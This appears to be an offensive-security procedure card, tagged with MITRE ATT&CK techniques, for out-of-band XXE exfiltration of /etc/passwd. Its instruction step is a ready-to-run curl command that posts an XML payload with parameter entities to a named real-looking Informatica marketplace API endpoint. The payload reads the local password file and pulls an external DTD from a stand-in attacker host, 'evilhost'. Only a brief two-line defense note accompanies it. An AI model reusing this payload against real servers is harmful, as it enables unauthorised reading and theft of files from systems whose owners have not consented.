---
tags:
  - xxe
  - oob
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: a36c9c05-71cc-451a-9771-ab3b04a9dd4f
created_at: '2025-12-13T09:00:27.545Z'
updated_at: '2025-12-13T09:00:27.545Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Attempt OOB XXE for File Exfiltration

## Summary

This procedure attempts out-of-band (OOB) XXE to exfiltrate sensitive file contents like /etc/passwd to an external server.

## Description

Using parameter entities in the DTD, the payload loads file content and sends it to an attacker-controlled HTTP endpoint. This method bypasses restrictions on direct entity expansion in responses. Initial payloads may require refinement if issues occur.

## Requirements

1. Control over an external HTTP server to receive data
2. Valid XXE vulnerability confirmed
3. Network connectivity from target to attacker server

## Defense

Defensive measures and detection strategies:

- Block outbound connections from servers
- Use Web Application Firewall (WAF) to detect XXE patterns

## Objectives

1. Exfiltrate file contents out-of-band
2. Confirm data leakage
3. Identify refinement needs

## Instructions

### Step 1: Send OOB XXE Payload

**Context**: Inject parameter entities to send file content externally.

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://evilhost/xx.html"> %dtd; %send; ]><query>search</query>' https://marketplace.informatica.com/api/rest/mpapi/infaMPAPISearchWebService/query
```

> Monitor the external server for incoming data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xxe]]
- [[oob]]
- [[Exfiltration]]
